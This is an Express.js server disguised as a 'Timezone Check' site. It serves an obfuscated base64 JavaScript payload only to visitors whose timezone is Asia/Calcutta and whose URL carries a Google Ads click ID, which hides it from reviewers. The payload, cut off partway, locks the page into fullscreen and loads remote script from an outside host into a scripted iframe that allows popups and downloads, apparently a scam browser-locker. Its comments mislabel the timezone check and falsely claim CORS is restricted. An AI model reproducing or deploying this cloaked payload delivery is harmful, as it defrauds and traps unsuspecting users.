const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors'); // Import cors

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Enable CORS and restrict it to http://localhost:3000
app.use(cors());
// Serve the HTML file
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Timezone Check</title>
    </head>
    <body>
        <h1>Welcome to Website B</h1>
        <p>This server checks the timezone and URL parameters.</p>
    </body>
    </html>
    `);
});

// Endpoint to receive data from website A
app.post('/api/timezone', (req, res) => {
    const { timezone, fullUrl } = req.body;

    // Check if the request body is valid
    if (!req.body || !timezone || !fullUrl) {
        return res.status(400).send('Invalid request body.');
    }

    console.log(`Received timezone: ${timezone}, fullUrl: ${fullUrl}`);

    // Check if the timezone is Asia/Calcutta
    const isTimezoneJapan = timezone === 'Asia/Calcutta';

    // Check if the URL contains 'gclid'
    const containsGclid = fullUrl.includes('gclid');

    // Base64 code to send in response
    const base64Code = 'Ly8gSGlkZSBvdmVyZmxvdyBvbiB0aGUgZG9jdW1lbnQgZWxlbWVudApkb2N1bWVu
dC5kb2N1bWVudEVsZW1lbnQuc3R5bGUub3ZlcmZsb3cgPSAiaGlkZGVuIjsKCi8v
IEluc2VydCBhbiBIVE1MIGRpdiB3aXRoIHNwZWNpZmljIHN0eWxlcyBpbnRvIHRo
ZSBkb2N1bWVudCBib2R5CmRvY3VtZW50LmJvZHkuaW5zZXJ0QWRqYWNlbnRIVE1M
KCJhZnRlcmJlZ2luIiwgCiAgICAiPGRpdiBpZD0iYnJ1Y2VEaXYiIHN0eWxlPSJa
LWluZGV4OiA5OTk5OyBwb2ludGVyLWV2ZW50czogYXV0bzsgb3ZlcmZsb3c6IGhp
ZGRlbiI+PC9kaXY+IgpbKTsKCi8vIEFkZCBhIGNsaWNrIGV2ZW50IGxpc3RlbmVy
IHRvIHRyaWdnZXIgZnVsbHNjcmVlbiBhbmQgZmV0Y2ggZXh0ZXJuYWwgY29udGVu
dApkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uKCkg
ewogICAgd2luZG93LnNjcm9sbFRvKDAsIDApOwogICAgc2V0VGltZW91dCgoKSA9
PiB7CiAgICAgICAgaWYgKGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5yZXF1ZXN0
RnVsbHNjcmVlbiApewogICAgICAgICAgICBkb2N1bWVudC5kb2N1bWVudEVsZW1l
bnQucmVxdWVzdEZ1bGxzY3JlZW4oKTsKICAgICAgICB9IGVsc2UgaWYgKGRvY3Vt
ZW50LmRvY3VtZW50RWxlbWVudC5tb3pSZXF1ZXN0RnVsbFNjcmVlbikgewogICAg
ICAgICAgICBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQubW96UmVxdWVzdEZ1bGxT
Y3JlZW4oKTsKICAgICAgICB9IGVsc2UgaWYgKGRvY3VtZW50LmRvY3VtZW50RWxl
bWVudC53ZWJraXRSZXF1ZXN0RnVsbHNjcmVlbikgewogICAgICAgICAgICBkb2N1
bWVudC5kb2N1bWVudEVsZW1lbnQud2Via2l0UmVxdWVzdEZ1bGxzY3JlZW4oKTsK
ICAgICAgICB9IGVsc2UgaWYgKGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5tc1Jl
cXVlc3RGdWxsc2NyZWVuKSB7CiAgICAgICAgICAgIGRvY3VtZW50LmRvY3VtZW50
RWxlbWVudC5tc1JlcXVlc3RGdWxsc2NyZWVuKCk7CiAgICAgICAgfQogICAgfSwg
MTAwKTsKCiAgICAvLyBGZXRjaCBKYXZhU2NyaXB0IGNvbnRlbnQgZnJvbSB0aGUg
bmV3IFVSTCBhbmQgZW1iZWQgaXQgaW4gYW4gaWZyYW1lCiAgICBmZXRjaCgiaHR0
cHM6Ly9oZXRhLm9ucmVuZGVyLmNvbS8iKQogICAgICAgIC50aGVuKHJlc3BvbnNl
ID0+IHJlc3BvbnNlLnRleHQoKQogICAgICAgIC50aGVuKGNvbnRlbnQgPT4gewog
ICAgICAgICAgICAvLyBDcmVhdGUgYW4gSFRNTCB3cmFwcGVyIGZvciB0aGUgSmF2
YVNjcmlwdCBjb250ZW50CiAgICAgICAgICAgIGNvbnN0IGh0bWxDb250ZW50ID0g
YAogICAgICAgICAgICAgICAgPGh0bWw+CiAgICAgICAgICAgICAgICA8aGVhZD48
dGl0bGU+RW1iZWRkZWQgQ29udGVudDwvdGl0bGU+PC9oZWFkPgogICAgICAgICAg
ICAgICAgPGJvZHk+CiAgICAgICAgICAgICAgICAgICAgPHNjcmlwdCB0eXBlPSJ0
ZXh0L2phdmFzY3JpcHQiPntjb250ZW50fTwvc2NyaXB0PgogICAgICAgICAgICAg
ICAgPC9ib2R5PgogICAgICAgICAgICA8L2h0bWw+YAo7CiAgICAgICAgICAgIGxl
dCBibG9iID0gbmV3IEJsb2IoW2h0bWxDb250ZW50XSwgeyB0eXBlOiAidGV4dC9o
dG1sIiB9KTsKICAgICAgICAgICAgbGV0IHVybCA9IFVSTC5jcmVhdGVPYmplY3RV
UkwoYmxvYik7CiAgICAgICAgICAgIGxldCBpZnJhbWUgPSBkb2N1bWVudC5jcmVh
dGVFbGVtZW50KCJpZnJhbWUiKTsKICAgICAgICAgICAgaWZyYW1lLnNyYyA9IHVy
bDsKICAgICAgICAgICAgaWZyYW1lLnN0eWxlLndpZHRoID0gIjEwMCUiOwogICAg
ICAgICAgICBpZnJhbWUuc3R5bGUuaGVpZ2h0ID0gIjEwMCUiOwogICAgICAgICAg
ICBpZnJhbWUuZnJhbWVCb3JkZXIgPSAiMCI7CiAgICAgICAgICAgIGlmcmFtZS5z
ZXRBdHRyaWJ1dGUoImFsbG93ZnVsbHNjcmVlbiIsICIiKTsKICAgICAgICAgICAg
aWZyYW1lLnNldEF0dHJpYnV0ZSgid2Via2l0YWxsb3dmdWxsc2NyZWVuIiwgIiIp
OwogICAgICAgICAgICBpZnJhbWUuc2V0QXR0cmlidXRlKCJtb3phbGxvd2Z1bGxz
Y3JlZW4iLCAiIik7CiAgICAgICAgICAgIGlmcmFtZS5zYW5kYm94ID0gImFsbG93
LXNjcmlwdHMgYWxsb3ctcG9wdXBzIGFsbG93LWRvd25sb2FkcyI7CiAgICAgICAg
ICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJicnVjZURpdiIpLmFwcGVuZENo
aWxkKGlmcmFtZSk7CiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlk
KCJicnVjZURpdiIpLnN0eWxlLmhlaWdodCA9ICIxMDB2aCI7CiAgICAgICAgfSkK
ICAgICAgICAuY2F0Y2goZXJyb3IgPT4gewogICAgICAgICAgICBjb25zb2xlLmVy
cm9yKCJFcnJvciBmZXRjaGluZyB0aGUgSmF2YVNjcmlwdDoifSwgZXJyb3IpOwog
ICAgICAgIH0pOwp9LCB7IG9uY2U6IHRydWUgfSk7CgovLyBBZGQgYSBzZWNvbmQg
Y2xpY2sgZXZlbnQgbGlzdGVuZXIgdG8gcGxheSBhdWRpbwpkb2N1bWVudC5hZGRF
dmVudExpc3RlbmVyKCJjbGljayIsIGZ'; // Your base64 string here

    // If both conditions are met, respond with the base64 code
    if (isTimezoneJapan && containsGclid) {
        console.log(`Response sent: ${base64Code}`);
        return res.status(200).send(base64Code); // Send the base64 string directly
    } else {
        const responseMessage = 'Conditions not met.';
        console.log(responseMessage);
        return res.status(200).send(responseMessage);
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
